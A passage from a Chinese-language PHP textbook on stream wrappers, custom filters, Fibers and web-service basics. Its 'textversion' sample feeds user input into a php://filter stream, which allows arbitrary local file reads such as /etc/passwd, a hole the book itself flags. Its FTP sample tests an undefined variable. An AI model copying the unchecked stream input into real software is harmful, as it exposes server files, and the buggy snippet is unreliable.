流是文件处理（无论是远程还是本地）中的一个基本概念。流是一个数据流，即可以用 PHP 处理的数据流。这里的特殊之处在于，PHP 通过标准化接口支持不同的流变体。这大致可比作数据库领域中的 DSN（另见第 18 章）：您拥有可用于访问数据源的某些函数，这些函数适用于所有数据源，并使用 DSN 语法来指定您正在使用的数据源类型。

流也是如此：您以特定语法指定一个流，然后以类似于文件的方式操作它。这可以用 fopen() 作为一个很好的示例来很好地说明：到目前为止，您始终将文件名（如 "test.txt"）作为参数指定。在流表示法中，您必须将要使用的协议写在前面——就像 URL 一样。对于文件，它称为 file:///。要打开文件，请使用以下内容：

```
$file = fopen("file:///test.txt", "rb");
```

在上一章中这不是必需的，因为 file:/// 是 PHP 流函数的标准协议。因此您可以省略它。但是，表 26.1 中列出了一整套其他协议。

| 流 | 描述 |
| :--- | :--- |
| file:///path/to/target-file | 本地文件或网络共享上的文件（随后为 \\sharename\\filename） |
| tcp://domain.xy | TCP 连接 |
| ssl://domain.xy | SSL/TLS 连接 |
| udp://domain.xy | UDP 连接 |
| http://www.domain.xy | 通过 HTTP 访问文件 |
| https://www.domain.xy | 通过 HTTPS 访问文件 |
| ftp://user:password@ftp.domain.xy/file | 通过 FTP 访问文件 |
| ftps://ftp.domain.xy/file | 通过 SFTP 访问文件 |
| php://stdin | 输入 PHP 脚本 |
| php://stdout | PHP 脚本输出 |
| `php://input` | 通过 POST 的输入数据 |
| `php://output` | PHP 输出缓冲区 |
| `php://stderr` | PHP 错误 |
| `php://filter` | 使用预定义过滤器 |
| `compress.zlib://file` | 由 gzip 压缩的数据 |
| `compress.bzip2://file` | 通过 bzip2 压缩的数据 |

表 26.1 PHP 的可能流

> **注意**
>
> 尽管表格在流类型方面几乎完整（未专门列出 tls://、unix:// 和 udp:// 等特例），但并未指定所有变体。例如，也可以为 HTTP 和 HTTPS 请求指定用户名和密码；这可以直接在流中完成。

文件流在上一章中已经详尽讨论过，尽管 _流_ 术语并未出现在那里。因此，本节剩余部分将处理其他可能的流，这些流始终会附带简短示例。

### 26.2.2 HTTP 流

使用 `fopen()` 打开 HTTP 地址是否有意义？如果是要读取网站上的数据，当然有意义。由此也可知 `fopen()` 必须指定的文件模式：当然是 "r"，因为您只能读取数据，而不能写入数据。以下脚本将读取 PHP 主页并将其输出（参见图 26.1）；请记得激活前面描述过的 OpenSSL。

```html
<h1>The PHP homepage</h1>
<?php
$file = fopen("https://www.php.net/", "r");
while (!feof($file)) {
    $line = fread($file, 4096);
    echo $line;
}
fclose($file);
?>
```

示例 26.1 读取 PHP 主页（"http-1.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_728_0.png)

图 26.1 由 "fopen()" 获取的 PHP 主页——但不幸的是，由于链接的 CSS 相对较多，它并不特别美观。

> 提示
> 如果使用 file_get_contents()，主页的输出会更快（且无需 while 循环）。该函数也支持流。

如果您有文件句柄，可以显示关于流的元数据。根据流类型，这可能是不同的信息。stream_get_meta_data() 函数将所有这些数据作为数组返回（参见图 26.2）。让我们在以下示例中再次读取 PHP 主页时来看看这一点。

```
<?php
$file = fopen("https://www.php.net/", "r");
echo "<pre>";
echo htmlspecialchars(
    print_r(stream_get_meta_data($file), true)
);
echo "</pre>";
fclose($file);
?>
```

示例 26.2 向 "php.net" 发送的 HTTP 请求的元数据（"http-2.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_729_0.png)

图 26.2 HTTP 请求的元数据

与流相关的另一个重要术语是 *上下文*。您可以在许多文件函数中根据上下文（即所使用的流）指定其他选项。要创建上下文，需要 `stream_context_create()` 函数。您将一个数组作为参数传递；其键是流类型（此处为 "http"），其值是包含所有选项的另一个数组：

```
$context = stream_context_create(
    ["http" =>
    [
        "method" => "POST",
        "header" => "Content-type: application/x-www-form-urlencoded",
        "content" => "search_string=HTTP&search_in=packages"
    ]
    ]
);
```

在 content 下，您可以看到 POST 数据。为了找到一个很好的示例，我们分析了 PECL（*https://pecl.php.net*）的主页。顶部有一个用于搜索网站的表单。这里您可以看到相应的（有些缩短和简化）标记：

```html
<form method="post" action="/search.php">
<input class="small" type="text" name="search_string"
value="" size="20" accesskey="s">
in the
<select name="search_in" class="small">
<option value="packages">Packages</option>
<option value="site">This site (using Google)</option>
<option value="developers">Developers</option>
<option value="pecl-dev">Developer mailing list</option>
<option value="pecl-cvs">SVN commits mailing list</option>
</select>
</form>
```

关键点——即表单字段的名称（以及在某些情况下的值）和表单的发送目的地——以粗体突出显示。由此可以确定 POST 请求的数据：

- 搜索词位于 `search_string` 字段中。
- 要搜索 PECL 软件包列表，需要 `search_in=packages` 值。
- 表单的目标是 `pecl.php.net` 上的 `/search.php`。

这就完成了 POST 示例：搜索被执行并输出结果。当我们搜索软件包时，会自动重定向到相应的搜索 URL（`package-search.php`）。`file_get_contents()` 函数支持重定向，因此您最终会得到最终页面（参见图 26.3）。¹

```php
<h1>Result of the POST request</h1>
<?php
$context = stream_context_create(
[ "http" =>
[
"method" => "POST",
"header" => "Content-type: application/x-www-form-urlencoded",
"content" => "search_string=HTTP&search_in=packages"
]
]
);
$data = file_get_contents(
"https://pecl.php.net/search.php", false, $context);
echo $data;
?>
```

示例 26.3 一个 POST 请求（"http-3.php"）

¹ 注意：在某些 PHP 版本中，您会收到一个无法解释的 HTTP 404 错误消息。





![](img/ae7820c36e8f24c1623d26668b28e80e_731_0.png)

### 图 26.3 POST 请求的结果

你也可以通过自己设置 HTTP 请求，以“手动”方式发送相同的请求。为此，你必须先打开与 Web 服务器的套接字连接，然后自己输入所有必要的数据。相关的函数是 fsockopen()。它为你提供套接字连接的句柄。你需要五个参数（尽管出于可读性原因，示例中使用了具名参数，但仍遵循正确的顺序）：

- 1. 流名称（在示例中，tcp://）
- 2. 端口号（HTTP 通常为 80，HTTPS 通常为 443）
- 3. 带有错误号的返回变量
- 4. 带有错误消息的返回变量
- 5. 超时时间（以秒为单位）

然后，你可以使用 fwrite() 将数据发送到套接字，并使用 fgets() 读取返回值。请查看以下完整清单。

```
<h1>Result of the POST request</h1>
<pre>

<?php
$socket = fsockopen(
    hostname: "tcp://pecl.php.net",
    port: 80,
    error_code: $errorcode,
    error_message: $errormsg,
    timeout: 30
);
$data = "search_string=HTTP&search_in=packages";
fwrite($socket, "POST /search.php HTTP/1.1\r\n");
fwrite($socket, "Host: pecl.php.net\r\n");
fwrite($socket, "Accept: */*\r\n");
fwrite($socket, "Content-length: " . strlen($data) . "\r\n");
fwrite($socket, "Content-type: application/x-www-form-urlencoded\r\n");
fwrite($socket, "\r\n$data\r\n");
while (!feof($socket)) {
    echo htmlspecialchars(fgets($socket, 4096));
}
fclose($socket);
?>
</pre>
```

### 清单 26.4 通过套接字发送 POST 请求 ("http-4.php")

如图 26.4 所示，POST 请求成功。但是，返回值是 HTTP 代码 302，表示“已找到，但不是实际目标页面”。你可以在 Location HTTP 标头中看到原因：正在执行重定向到 http://pecl.php.net/package-results.php?pkg_name=HTTP。

![](img/ae7820c36e8f24c1623d26668b28e80e_732_0.png)

### 图 26.4 套接字 POST 请求的结果

**注意**
PECL 网站当然随时可能发生更改。因此，无法保证代码将来仍以完全相同的方式工作。

### FTP 流

使用类型为 `ftp://user:password@ftp.domain.xy/path/file` 或 `ftps://user:password@ftp.domain.xy/path/file` 的 FTP 流，你可以像处理常规文件一样处理 FTP 服务器上的文件（参见前一章）。如果对 `fopen()` 使用文件模式 `"rb"`，则可以从 FTP 服务器下载文件；使用 `"wb"` 或 `"xb"`，则可以创建文件。还有另一个选项：你可以向 FTP 文件追加数据——即也可以使用 `"ab"` 模式。

### 26.2.3 PHP 流

在表 26.1 列出的流中，有一个特别有趣：`php://filter`。PHP 已经为流包含了预定义的过滤器：如果你向这些过滤器写入数据，数据将被自动转换。要试用以下示例，你仍然需要前一章中的 `test.txt` 文件，其内容如下：

人生皆是考试
而我们只是考生

你可以在过滤器中输入以下数据：

- 对于 resource，指定要访问的流的名称。
- 使用 read，可以指定在读取时应用的过滤器。
- 使用 write，可以定义在写入时使用的过滤器。

以下清单显示了一个示例。

```
<pre>
<?php
echo htmlspecialchars(
file_get_contents(
"php://filter/read=string.toupper/resource=test.txt"
)
);
?>
</pre>
```

### 清单 26.5 "string.toupper" 过滤器 ("filter-1.php")

图 26.5 显示了结果：`string.toupper` 将流数据转换为大写字母。

![](img/ae7820c36e8f24c1623d26668b28e80e_734_0.png)

### 图 26.5 过滤器的结果

以下四个过滤器是 PHP 内置的：

- 1. string.rot13 执行 ROT13 编码。²
- 2. string.strip_tags 使用 strip_tags() 函数预处理所有数据——即，删除所有标记。
- 3. string.tolower 将所有数据转换为小写（与 strtolower() 相同）。
- 4. string.toupper 将所有数据转换为大写（与 strtoupper() 相同）。

还有一些转换过滤器：

- convert.base64-decode 对 Base64 数据进行解码（与 base64_decode() 相同）。
- convert.base64-encode 将数据编码为 Base64 格式（与 base64_encode() 相同）。
- convert.quoted-printable-decode 对可打印引用数据进行解码（与 quoted_printable_decode() 相同）。
- convert.quoted-printable-encode 将数据编码为可打印引用格式（与 quoted_printable_encode() 相同）。

在前一章保存访客留言数据时，我们本可以特别使用 Base64 过滤器。

当然，这些只是非常有限的选项。幸运的是，PHP 提供了定义自己流的选项。为此，你需要一个自己的类，该类继承自 php_user_filter。该类中必须有一个 filter() 方法，用于处理数据。该方法的返回类型必须设置为 int，以避免弃用警告。方法内部的过程始终相同，因此你将通过复制并粘贴来操作（此示例也是以这种方式创建的）。关键的一行（也是你始终要修改的一行）是修改 $bucket->data 的那一行。此属性始终包含当前查看的数据，并且也是可写的。以下是一个类，其中所有数据都使用 htmlspecialchars() 进行处理：

² 从 a 到 z 和 A 到 Z 的每个字母字符都被替换为与原字符相隔 13 个字符位置的 ASCII 码对应的字符。

```
class htmlspecialchars_filter extends php_user_filter {
    function filter($in, $out, &$consumed, $closing): int
    {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $bucket->data = htmlspecialchars($bucket->data);
            $consumed += $bucket->datalen;
            stream_bucket_append($out, $bucket);
        }

        return PSFS_PASS_ON;
    }
}
```

使用 stream_filter_register()，你可以在系统下以自选名称注册该类：

```
stream_filter_register(
    "string.htmlspecial",
    "htmlspecialchars_filter"
);
```

stream_get_filters() 函数可用于检查过滤器是否已实际注册到系统中。然后你也可以使用该过滤器。以下流名称打开 test.txt 文件，将内容转换为大写，并转换 HTML 特殊字符；你可以在图 26.6 中看到输出：

php://filter/read=string.toupper|string.htmlspecial/resource=test.txt

![](img/ae7820c36e8f24c1623d26668b28e80e_735_0.png)

### 图 26.6 所有过滤器——以及我们过滤器的结果

请考虑以下完整清单。

```
<?php
class htmlspecialchars_filter extends php_user_filter {
    function filter($in, $out, &$consumed, $closing): int
    {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $bucket->data = htmlspecialchars($bucket->data);
            $consumed += $bucket->datalen;
            stream_bucket_append($out, $bucket);
        }
        return PSFS_PASS_ON;
    }
}
stream_filter_register(
    "string.htmlspecial",
    "htmlspecialchars_filter"
);
echo "<h1>Filter</h1><pre>";
echo htmlspecialchars(print_r(stream_get_filters(), true));
echo "</pre><h1>Result</h1><pre>";
echo file_get_contents(
    "php://filter/read=string.toupper|string.htmlspecial/resource=test.txt"
);
echo "</pre>";
?>
```

### 清单 26.6 自定义过滤器的使用 ("filter-2.php")

> **注意**
> 
> 使用 `stream_filter_append()`，还可以使用函数将过滤器追加到流中——使用 `stream_filter_prepend()`，甚至可以将其添加到过滤器列表的开头。

### 26.2.4 压缩流

我们将要介绍的最后几种流类型处理压缩数据。支持的两种文件格式与当前发布 PHP 源代码的格式相同：gzip 和 bzip2。PHP 为两种归档方法都提供了单独的函数，但使用流时，你可以获得标准化的访问。

写入数据非常简单——像往常一样，使用 PHP 的文件函数。以下脚本再次打开 `test.txt` 文件，并将其保存为 GZ 和 BZ2 格式。





```php
if (@file_put_contents(
	"compress.zlib://test.gz",
	file_get_contents("test.txt")
)) {
echo "GZ file written.<br />";
} else {
echo "Error writing the GZ file.<br />";
}
if (@file_put_contents(
	"compress.bzip2://test.bz2",
	file_get_contents("test.txt")
)) {
echo "BZ2 file written.<br />";
} else {
echo "Error writing the BZ2 file.<br />";
}
?>
```

清单 26.7 压缩文件 ("zip-write.php")

但是，如果在 Windows 上运行该脚本，将得到图 26.7 所示的结果。原因：BZ2 过滤器在那里不可用（在 Unix/Linux 上，如果系统中安装了相应的库，则该过滤器可用）。要更改此情况，必须向 `php.ini` 添加以下选项：

```
extension=bz2
```

在所有系统上，GZ 即使不设置 `php.ini` 也能正常工作。在测试中，`test.txt` 文件从 362 字节压缩到了 84 字节。

![](img/ae7820c36e8f24c1623d26668b28e80e_737_0.png)

图 26.7 在此处 gzip 可用，但 bzip2 不可用（未进行适当配置）

顺便说一句，您也可以使用相同的流类型读回压缩文件。下面的清单显示了相应的代码。

```php
if (file_exists("test.gz")) {
    echo "<h1>test.gz</h1><pre>";
    echo htmlspecialchars(
        file_get_contents("compress.zlib://test.gz")
    );
    echo "</pre>";
}
if (file_exists("test.bz2")) {
    echo "<h1>test.bz2</h1><pre>";
    echo htmlspecialchars(
        file_get_contents("compress.bzip2://test.bz2")
    );
    echo "</pre>";
}
?>
```

清单 26.8 读取压缩文件 ("zip-read.php")

您将收到两个文件的内容（参见图 26.8）——或者，如果 Windows 未相应配置，则仅看到 GZ 文件中的数据。Unix/Linux 用户将看到两个存档。

![](img/ae7820c36e8f24c1623d26668b28e80e_738_0.png)

图 26.8 Web 浏览器中的文件内容

> **注意**
> 您也可以尝试使用流打开 PHP 源代码存档——例如，`php-8.x.y.tar.gz` 文件。但是，您的系统可能会很快达到其（内存）限制。此外，它包含的文件是一个 TAR 文件，无法使用 PHP 的内置工具轻松编辑。

## PHP 的 FTP 函数

如果要使用 FTP 特定函数，必须在 Unix/Linux 下专门为此配置 FTP；configure 的 `--enable-ftp` 开关负责此事。之后，您将拥有一系列特殊的 FTP 函数，它们方便地封装了所有 FTP 命令。下面的清单提供了一个说明性示例。

```php
<?php
$connection = ftp_connect("ftp.mozilla.org");
$login = ftp_login($connection, "anonymous", "guest@xy.zzz");
if ($connect && $login) {
    if (ftp_get(
        $connection,
        "README.txt",
        "/README",
        FTP_ASCII
    )) {
        echo "File <a href=\"README.txt\">saved</a>.";
    } else {
        echo "Error during download.";
    }
}
ftp_close($connection);
?>
```

清单 26.9 PHP 的 FTP 函数 ("ftp.php")

清单 26.9 中的代码从 Mozilla 的 FTP 服务器 (ftp.mozilla.org) 下载 README 文件，该文件包含有关服务器的一般信息。该文件保存在本地，可以在那里查看。所选下载模式是 FTP_ASCII；对于二进制文件，需要 FTP_BINARY。

## 26.3 纤程

在 PHP 8.1 中引入了纤程（Fibers）这一新特性，用于同时执行多个任务。严格来说，纤程是带有暂停按钮的函数：如果需要，可以中断并在以后恢复。这也意味着 Fiber 类实例有三个主要方法：

- start()
  启动纤程函数
- suspend()
  暂停纤程函数
- resume()
  恢复已暂停的纤程函数

为什么这个主题出现在主要关于网络通信和 HTTP 的章节中？因为纤程是执行并行 HTTP 请求的绝佳方式！为此，我们创建多个 Fiber 类的实例。构造函数中包含作为匿名函数的纤程代码。然后，我们通过调用它们的 start() 方法在循环中执行所有纤程。清单 26.10 显示了相应的代码。

```php
<?php
$urls = [
    "https://www.php.net/",
    "https://windows.php.net/",
    "https://pecl.php.net/"
];

$fibers = [];

foreach ($urls as $url) {
    array_push($fibers, new Fiber(function() use ($url) {
        $contents = file_get_contents($url);
    }));
}

foreach ($fibers as $fiber) {
    $data = $fiber->start();
}
?>
```

清单 26.10 使用纤程进行并行 HTTP 请求 ("fibers.php")

关于纤程的进一步（虽然相当简短）信息可以在 PHP 在线文档 www.php.net/fibers 中找到。有关纤程实现的更详细信息，值得查看此功能的 RFC (https://wiki.php.net/rfc/fibers)。

## 26.4 应用示例

可以使用流创建一些有用的应用程序。本节给出了两个适合进一步开发的建议。

### 26.4.1 网页的文本版本

首先，让我们看看创建网页文本版本的一种方法。尽管基于 Web 的浏览器（如 Lynx）越来越好，但考虑到无障碍（无障碍设计）变得越来越重要，考虑这个项目是个好主意。

我们如何实现这一点？使用特殊的流过滤器。`string.strip_tags` 过滤器已经相当不错了，但假设我们想保留 `<p>` 标签的内容。我们还想使用 `htmlspecialchars()` 准备输出。此时仍然需要字符串操作：因为 `<p>` 标签（及其内容）应予以保留，所以必须删除标签本身。在自定义过滤器中，以下指令是关键的：

```
$bucket->data = htmlspecialchars(
    str_replace("<p>", "", strip_tags($bucket->data, "<p>"))
```

清单 26.11 显示了一个小示例：用户输入一个网址，加载并将其转换为文本版本。图 26.9 显示了输出。

```
<form method="post">
URL: <input type="text" name="url" value="<?php
    echo (isset($_POST["url"]) && is_string($_POST["url"])) ? htmlspecialchars($_POST["url"]) : "";
?>"/> <input type="submit" />
</form>
<hr />
<?php
if (isset($_POST["url"]) && is_string($_POST["url"])) {
    $url = $_POST["url"];
    class textversion_filter extends php_user_filter {
        function filter($in, $out, &$consumed, $closing): int
        {
            while ($bucket = stream_bucket_make_writeable($in)) {
                $bucket->data = htmlspecialchars(
                    str_replace("<p>", "", strip_tags($bucket->data, "<p>"))
                );
                $consumed += $bucket->datalen;
                stream_bucket_append($out, $bucket);
            }
            return PSFS_PASS_ON;
        }
    }
    stream_filter_register(
        "string.textversion",
        "textversion_filter"
    );
    echo "<pre>";
    echo file_get_contents(
        "php://filter/read=string.textversion/resource=$url"
    );
    echo "</pre>";
}
?>
```

清单 26.11 网页的简单文本版本 ("textversion.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_742_0.png)

图 26.9 “phpinfo()” 调用的文本版本

> **注意**
> 
> 此应用程序当前形式不打算用于互联网，因为您可以在 URL 字段中输入任何流，包括本地文件名（例如 /etc/passwd）。如果将此文本版本集成到网站中，必须使脚本特别安全（例如，仅允许来自特定服务器的 URL）。

### 26.4.2 在线压缩器

第二个应用程序将一项特殊任务——压缩文件——转移到 Web 服务器。假设用户没有 gzip 或 bzip2。如果您有自己的、更好的压缩算法，可以将其作为单独的流实现，从而提供该服务（但仅限内部使用）。即使 gzip 算法并不特别，该示例仍然展示了特殊 PHP 流的潜力。

用户通过 `<input type="file" />` 将文件上传到 Web 服务器。使用 is_uploaded_file() 进行常规检查后，先用 file_get_contents() 读取文件，然后再用 file_put_contents() 写入——这次是压缩写入：

```
$tempfile = tempnam("/tmp", "php");
@file_put_contents(
    "compress.zlib://$tempfile",
```




file_get_contents($_FILES["file"]["tmp_name"]))
);
```

数据现在存储在一个临时文件中，其名称是通过 tempnam() 创建的（提供的路径 /tmp 必须存在于您的系统上并且可写）。通过 file_get_contents()，我们再次读取文件，并通过手动编写相应的 HTTP 标头将其输出。作为向 Web 浏览器推荐的文件名，我们使用原始文件的名称（通过 $_FILES 确定）加上扩展名 .gz：

```
$data = file_get_contents($tempfile);
header("Content-type: application/x-gzip");
header("Content-disposition: inline; filename=" .
basename($_FILES["file"]["name"]) . ".gz");
echo $data;
exit();
```

请参阅以下完整清单；输出显示在图 26.10 中。

```
<?php
if (isset($_FILES["file"]) && isset($_FILES["file"]["tmp_name"]) &&
is_uploaded_file($_FILES["file"]["tmp_name"])) {
$tempfile = tempnam("/tmp", "php");
if (@file_put_contents(
"compress.zlib://$tempfile",
file_get_contents($_FILES["file"]["tmp_name"]))
) {
$data = file_get_contents($tempfile);
header("Content-type: application/x-gzip");
header("Content-disposition: inline; filename=" .
basename($_FILES["file"]["name"]) . ".gz");
echo $data;
exit();
}
} else {
?>
<form method="post" enctype="multipart/form-data" action="">
<input type="file" name="file" />
<input type="submit" />
</form>
<?php
}
?>
```

## 清单 26.12 在线压缩器 ("online-gzip.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_744_0.png)

图 26.10 文件被上传、压缩并发送回去

> **注意**
>
> 一些来源将 application/gzip 列为 gzip 压缩文件的 MIME 类型。但是，如果您在 Google 上搜索 application/gzip 和脚本中使用的 application/x-gzip，后者 MIME 类型似乎返回的命中更多。

# 第 27 章 API 和服务

接口在现代网站、商店和其他 Web 应用程序中发挥着重要作用。因此，近年来 API 和 Web 服务的重要性显著增加。

API 已成为现代 IT 的不可或缺的一部分。无论您想到的是 Google、Amazon 和 eBay Web 服务等重大标准示例，还是公司、门户网站等之间的全面通信，Web 服务都在不同应用程序之间铺平了道路。

PHP 提供了数量惊人的合适库。本章的目的是向您展示最重要的库，并解释如何使用它们。然而，也展示了不使用库的简单 REST 服务解决方案。如果您尚不熟悉 Web 服务宇宙中的术语，可以在第 27.1.1 节中了解更多信息。

## 27.1 准备工作

本节关于准备工作分为两部分。首先，列出了一些关于 Web 服务的基础知识，如果您是专家，可以并且应该跳过。随后是必要库的安装。

### 27.1.1 Web 服务基础

Web 服务有着丰富多彩的历史。Dave Winer 作为一家名为 Userland 的小型软件公司的创始人，推动了这一进程。他将远程过程调用 (RPC) 构建到他的产品中。这本身并不新鲜：无论是 DCOM 还是 CORBA，之前都做过。Dave Winer 只是将他的 RPC 封装在 XML 中。由此产生了 XML-RPC。

这一想法得到了微软 COM 开发者小组的高度认可。正如 Dave Winer 稍后在他的博客中承认的那样，微软自 XML-RPC 刚开始不久就参与了其开发。这些想法随后与 IBM 合作成为 SOAP 协议。

### 架构

Web 服务经常被误解：作为商务意义上的服务、仅限于互联网等。根据我们的定义，Web 服务旨在实现跨机器通信：一台服务器与另一台服务器通信。开发人员设置好后，此过程会自动发生。

这里的起点是 RPC，过去曾通过各种技术存在。原则上，Web 服务也允许通过网络进行方法调用。但是，与以前的方法相比有两个重要区别：

- Web 服务也可以作为不带（立即）响应的简单消息发送。
- Web 服务由于开放标准而具有互操作性。这意味着任何服务器端技术都可以集成 Web 服务——并且当今 99% 的技术都这样做。1

Web 服务架构非常简单：您有一个服务提供者和一个服务消费者。消费者不应与最终客户混淆；相反，它是读取 Web 服务并使用其信息的一方（服务器）。在大多数情况下，服务消费者会在其网站布局中向其用户传递纯数据。

服务提供者和服务消费者也是面向服务架构 (SOA) 的关键要素。这个术语是现代应用程序面向对象架构 (OOA) 的对应物。OOA 是紧密集成的，而 SOA 基于松散耦合。松散耦合意味着服务可以轻松更改。最终目标是使服务即插即用。

在 SOA 中，另一个迄今未提及的角色出现了：服务目录。在目录中，服务提供者发布其服务。消费者找到它，并可以直接连接到提供者。如果通信双方互相认识，目录并非使用 Web 服务所必需的。然而，目录对于作为大众技术取得成功是不可或缺的。

### 标准

现在的问题是，Web 服务在技术上需要哪些标准。原则上，一个简单的 HTTP GET 请求已经可以声明为 Web 服务。这称为 REST 服务。

REST 原则当今用于网络中大多数 API。REST 代表表述性状态转移 (Representational State Transfer)，源于 R. T. Fielding 的博士论文，他也参与了 HTTP 协议的工作。其思想是互联网上的一切都可以通过 URI 映射。现有的 HTTP 动词 GET、POST、PUT 和 DELETE 足以实现 Web 服务。这里的标准基础是作为传输级别的 HTTP，即通过标准 Web 协议进行通信。

1 但是，不应隐藏问题。请阅读前面的小节“问题”。

在实践中，基于 REST 的服务是当今两个应用程序之间交换数据最常见的方式，因为它们提供了最佳性能。从 Google 到 Amazon，当今大多数服务都提供 REST API（参见图 27.1）。

![](img/ae7820c36e8f24c1623d26668b28e80e_747_0.png)

图 27.1 许多 Google API 基于 REST

REST 服务中的数据可以以多种格式交换。JSON (www.json.org) 是这方面的事实标准。

在 PHP 中，通过 HTTP GET 访问此类 Web 服务没有问题。返回值随后是 XML，例如可以使用 SimpleXML（参见第 29 章）轻松处理。大多数 REST Web 服务主要提供 JSON，即前面提到的用于数组和对象形式的结构化数据的基于字符串的表示法。

> **注意**
>
> 在 PHP 中，您不需要任何扩展即可使用基于 REST 的服务。访问 HTTP 数据的函数是直接包含的，处理 JSON 的函数也是如此。这也解释了 REST 服务的成功。您可以在第 27.2 节中找到此类访问的示例。

但是，REST 并非没有问题：它缺少用于 URL 中传输数据的定义格式，并且 PUT 和 DELETE HTTP 方法很少被实现。标准解决方案，例如带证书的 SSL、HTTP 基本身份验证以及基于 XML 的解决方案（如 OAuth 2）用于安全性和身份验证。

REST 的替代方案是基于以下标准使用经典 Web 服务：

- SOAP 是载体协议。它封装消息或方法调用。
- Web 服务描述语言 (WSDL) 是 Web 服务的描述。它并非绝对必要，但有助于在大多数实现中轻松集成 Web 服务。

现在让我们更仔细地看看这些。

### *SOAP*

SOAP 最初代表 *简单对象访问协议 (Simple Object Access Protocol)*。在版本 1.2 的 W3C 规范 (www.w3.org/TR/soap) 中，SOAP 现在简单地称为 SOAP。原因很明显：SOAP 既不特别简单，也与对象访问没有直接关系。一个没有含义的缩写并不十分有用，但这个已经自然化的名称不必更改。

SOAP 的结构由三个元素组成：

- *信封 (envelope)* 封装完整的 SOAP 消息。
- *SOAP 标头 (SOAP header)* 包含安全信息（例如），但可选。
- *SOAP 正文 (SOAP body)* 包含实际消息。

> **注意**
>
> 今天，SOAP 消息通常通过 HTTP（Web 协议）发送。相应地，HTTP 标头出现在消息上方。然而，这并非必须。事实上，您还可以使用任何其他协议作为传输协议。例如，SMTP 和 FTP 是可以设想的。





## WSDL

手动生成 SOAP 消息并非一项愉快的任务。WSDL 的存在正是由此得到证明。与 SOAP 一样，WSDL 是由微软和 IBM 提交给 W3C 的。当前版本为 2.0（www.w3.org/TR/wsdl.html）。

WSDL 为 Web 服务提供了描述。该描述包含所有方法，但也可以提供许多当今已不常用的附加信息。

WSDL 被大多数 Web 服务实现所使用，以减轻开发人员的工作量。当你创建一个服务时，实现可以自动生成 WSDL。如果你使用该服务，实现会访问 WSDL 并自动从中生成所需的 SOAP 消息。

## The Problems

当今 Web 服务被广泛使用。然而，仍有许多因素尚未得到最佳解决，或者正在被研究：

- 安全性。
- 性能。
- 事务和流程。
- 目录服务并不十分成功；PHP 也没有现代的实现。

谈到安全性，标准在不断开发：OASIS 的 WS-Security 提供了一种良好的总体方法。WS-Security 具有非常开放的结构，并结合了许多其他现有标准，例如 XML Encryption 和 SAML。然而，例如在 PHP 中，仍然没有全面的实现。

在实践中，我们已经看到了许多用于身份验证和会话管理的自定义方案。一些 Web 服务提供商也省略了进一步的安全机制。Amazon 是一个示例。只使用开发者令牌（即唯一 ID），该令牌随方法调用一起发送。亚马逊不使用进一步的安全措施（例如 SSL 证书），因为亚马逊自身处理最后一步（付款），并且只允许亚马逊客户进行此操作。

另一个经常被提及的问题是与二进制传输相比的性能劣势。这里的一种解决方案是使用 HTTP 的 gzip 功能。但是，你应该对此进行测试，以便真正确定压缩对你的数据量是否必要。基于 SOAP 的 Web 服务还经常因描述数据的“开销”而从性能角度受到批评。基于 REST 的服务解决了这个问题。

第三个问题是事务和流程的覆盖。让我们谈谈一个简单的例子。假设你预订了一张火车票。然后你上了一班满载的乘客列车，对自己的预订感到高兴，挤过头等舱，来到自己的座位前。但座位并非空着：一位和蔼的老妇人坐在那里。你进行了一番小小的争论，老妇人出示了她的车票，车票上显示的预订时间与你的车票上完全相同。在这种情况下，应用程序中的事务安全性已经失败。⁴

目前有许多标准旨在提供事务和流程功能。最有前途的可能是 BPEL。

## The Implementations

在谈到互操作性时，人们常常忘记，你自然需要在服务器端编程语言中实现 Web 服务。⁵ PHP 凭借其多样化的开发者社区而繁荣，并提供了不同的实现。一方面，这是一种优势；另一方面，用于实现新标准的剩余资源并不多。

以下是最重要的 Web 服务库和包的非常简要的概述：⁶

- nuSOAP 基于迪特里希·阿亚拉开发的内容。nuSOAP 本身最初源自由迪特里希·阿亚拉编写的 SOAPx4 库。其优势在于能够动态生成 WSDL 并与各种编程语言成功实现互操作性。
- PHP-SOAP 是随 PHP 提供的标准库，因此是在 PHP 中使用基于 SOAP 的 Web 服务最常用的方法。

> 注释
> PHP-SOAP 的开发在 PHP 社区中颇具争议。许多人希望将 PHP 4 中最流行的包 PEAR::SOAP 移植到 PHP 5。这种观点之所以产生，是因为 PHP-SOAP 中存在一些错误。但是，PHP-SOAP 最终占据了主导地位。

#### 27.1.2 安装

本节中安装说明的描述根据不同的实现进行了划分。

### nuSOAP

nuSOAP 的安装非常简单，因为它只是几个可以集成到项目中的 PHP 文件。从 https://github.com/contributte/nuSOAP 下载文件——这是原始 nuSOAP 针对现代 PHP 版本的重写。当前版本是 0.9.16。然后将 `lib` 目录放在项目文件夹或 Web 服务器上的任何其他文件夹中。你只需要将此文件集成到脚本中：

```
require_once "lib/nusoap.php";
```

作为替代方案，你也可以使用 Composer 进行安装。

4. 所幸，铁路旅行的问题已经解决多年。在这方面，这是一个虚构的例子。
5. 假定你不想手动操作，而对于大多数项目来说这几乎不可行。
6. 该选择基于实践和文献中的使用情况，但当然在某种程度上是主观的。

### PHP-SOAP

PHP-SOAP 必须在 Linux 配置期间激活：

```
--enable-soap
```

在 Windows 中，需要将以下行添加到 `php.ini`：

```
extension=php_soap.dll
```

PHP 7.2 或更高版本足够：

```
extension=soap
```

主机上可能已经配置好。使用 `phpinfo()` 检查模块是否已存在（参见图 27.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_751_0.png)

图 27.2 PHP-SOAP 作为模块集成

## 27.2 REST

访问 REST 消息基本上非常简单。REST 原则意味着数据和服务始终隐藏在唯一的 URL 后面。这意味着你只需要提供一个具有 URL 结构的 REST 服务器，其中可以调用单个方法。最简单的方法是通过 URL 参数，例如，采用以下结构：

- method 指定作为参数调用的方法。
- parameter 接收一个带有参数的数组。

这是一个完整的示例 URL：

```
http://localhost/php/rest_server.php?method=square&parameter=[24]
```

REST 数据交换可能有多种格式。你可以定义自己的 XML 格式，也可以使用 JSON，这是一种常用于数组和对象的表示法。

> **注释**
>
> URL 参数的名称完全可以自由选择。数据格式也是如此。一方面，这是灵活的——但另一方面，这也是 REST 的一个特点，因为你实际上必须自己定义一切。

以下脚本通过为方法和参数指定两个 GET 参数来创建 REST 服务器：

- 1. 系统首先检查参数是否可用：
  
  ```
